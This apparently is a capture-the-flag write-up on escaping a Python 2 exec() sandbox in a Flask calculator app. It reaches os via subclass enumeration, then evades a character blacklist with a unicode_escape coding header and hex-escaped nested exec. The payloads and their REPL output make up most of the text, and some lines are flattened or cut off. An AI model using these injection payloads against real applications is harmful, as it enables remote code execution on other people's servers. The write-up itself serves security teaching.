## Application Overview

Visiting the application homepage displays a calculator:

![Image](data:image/png;base64,)

Reviewing the code provided in the downloadable, we see that the application is built on Flask. Flask is a microframework for Python based on Werkzeug, Jinja 2 and good intentions.

## Finding a link to \_\_builtins \_\_ \_\_builtins \_\_

```python
>>> ingredient, measurements = '__import__(\'os\')#','1337' 
>>> recipe = '%s = %s' % (ingredient, measurements) 
>>> builtins, globals = {'__builtins__': None}, {} 
>>> exec(recipe, builtins, globals) Traceback (most recent call last): File "<stdin>", line 1, in <module> File "<string>", line 1, in <module> NameError: name '__import__' is not defined
```

Since you don't have access to \_\_builtins\_\_ you need to find a imported library that still has a link to it, we choose warnings.catch\_warnings (59)

```python
>>> for i in {}.__class__.__base__.__subclasses__(): ...     
>>> if '<class' in str(i): ...             
>>> 	for module in i.__init__.__globals__.keys(): # lookup all keys from global ...                     
>>> 		if 'sys' == module: ...                             
>>> 			print(i ... <class 'warnings.WarningMessage'> <class 'warnings.catch_warnings'> <class 'site._Printer'> <class 'codecs.IncrementalEncoder'> <class 'codecs.IncrementalDecoder'> <class 'future_fstrings.StreamReader'> <class 'site.Quitter'>
```

## Bypassing [ [ , ( ( , . . , \_\_ \_\_ on exec()

exec() accepts files as input, so you can pass source code encoding declarations like it's part of a code object, for this example we'll use unicode\_escape and send the payload equivalent in unicode literals.

```python
>>> ingredient, measurements = '#coding:unicode_escape\n' + ''.join(map(lambda x: '\\u00%02x' % ord(x) if any(map(lambda q: q in x, ['[', '(', '.', '_'])) else x, '''print {}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os')#''')), '1337' >>> recipe = '%s = %s' % (ingredient, measurements) >>> builtins, globals = {'__builtins__': None}, {} >>> exec(recipe, builtins, globals) <module 'os' from '/usr/local/Cellar/python@2/2.7.16_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os .pyc'>
```

But since \_ is blacklisted in the encoding header unicode\_escape we'll use a nested exec as a statement and pass a string containing hex literals.

```python
>>> ingredient, measurements = 'exec"' + ''.join(map(lambda x: '\\x%02x' % ord(x) if any(map(lambda q: q in x, ['[', '(', '.', '_'])) else x, '''print {}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os')"#''')), '1337' >>> recipe = '%s = %s' % (ingredient, measurements) >>> builtins, globals = {'__builtins__': None}, {} >>> exec(recipe, builtins, globals) <module 'os' from '/usr/local/Cellar/python@2/2.7.16_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os .pyc'>
```
